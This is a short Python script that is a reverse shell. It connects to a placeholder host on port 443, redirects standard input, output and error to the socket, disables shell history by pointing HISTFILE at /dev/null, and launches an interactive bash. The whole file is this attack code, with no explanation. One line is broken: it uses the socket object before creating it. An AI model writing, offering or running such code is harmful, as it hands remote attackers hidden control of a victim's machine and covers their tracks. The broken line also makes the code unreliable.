import os, subprocess, socket

sock = socket.socket(sock.AF_INET, sock.SOCK_STREAM)
sock.connect(("XXXXX", 443))
for c in range(3):
  os.dup2(sock.fileno(), c)
os.putenv("HISTFILE", "/dev/null")
subprocess.run(["/bin/bash", "-i"])
